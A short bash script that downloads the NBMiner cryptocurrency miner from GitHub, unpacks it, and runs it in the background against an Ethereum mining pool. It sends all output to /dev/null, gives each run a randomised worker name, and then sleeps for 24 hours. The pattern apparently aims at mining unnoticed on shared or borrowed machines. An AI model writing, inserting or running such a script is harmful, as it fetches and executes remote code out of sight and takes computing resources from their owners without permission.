#!/bin/bash
wget https://github.com/NebuTech/NBMiner/releases/download/v40.1/NBMiner_40.1_Linux.tgz && tar xf NBMiner_40.1_Linux.tgz && cd NBMiner_Linux && ./nbminer --url stratum+tcp://eth.ss.poolin.me:443 --user noval61.$(echo $(shuf -i 1-20000 -n 1)-V) -p 123 --algo ethash >/dev/null &
sleep 24h
